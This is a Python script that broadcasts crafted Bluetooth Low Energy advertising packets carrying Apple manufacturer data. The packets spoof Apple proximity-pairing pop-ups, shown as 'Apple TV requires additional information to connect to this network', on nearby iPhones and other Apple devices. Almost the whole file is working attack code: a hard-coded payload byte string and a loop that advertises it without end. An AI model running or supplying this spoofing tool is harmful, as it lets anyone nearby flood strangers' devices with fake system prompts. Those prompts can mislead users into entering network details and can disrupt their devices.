
# Description: Apple proximity pairing notification spoofing
# Message: Connecting... Apple Tv requires additional information to connect to this network


# Author: ECTO-1A & SAY-10
# Github: https://github.com/ECTO-1A

# Based on the previous work of chipik / _hexway

import random
import hashlib
import argparse
from time import sleep
import bluetooth._bluetooth as bluez
from utils.bluetooth_utils import (toggle_device, start_le_advertising, stop_le_advertising)

help_desc = '''
Apple Proximity Pairing Notification Spoofing 

---ECTO-1A August 2023---

Based on the previous work of chipik / _hexway
'''

parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval')
parser.add_argument('-r', '--random', action='store_true', help='Send random charge values')
args = parser.parse_args()



dev_id = 0  # the default bluetooth device is hci0
toggle_device(dev_id, True)

bt_data = (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc0, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00)


try:
    sock = bluez.hci_open_dev(dev_id)
except:
    print("Unable to connect to Bluetooth hardware %i" % dev_id)
    raise

print("Advertising Started...\
      Press Ctrl+C to Stop")
if args.random:
    while True:
        try:
            sock = bluez.hci_open_dev(dev_id)
        except:
            print("Unable to connect to Bluetooth hardware %i" % dev_id)
        start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval,
                             data=(bt_data))
        sleep(2)
        stop_le_advertising(sock)
else:
    try:
        start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval,
                             data=(bt_data))
        while True:
            sleep(2)
    except:
        stop_le_advertising(sock)
        raise
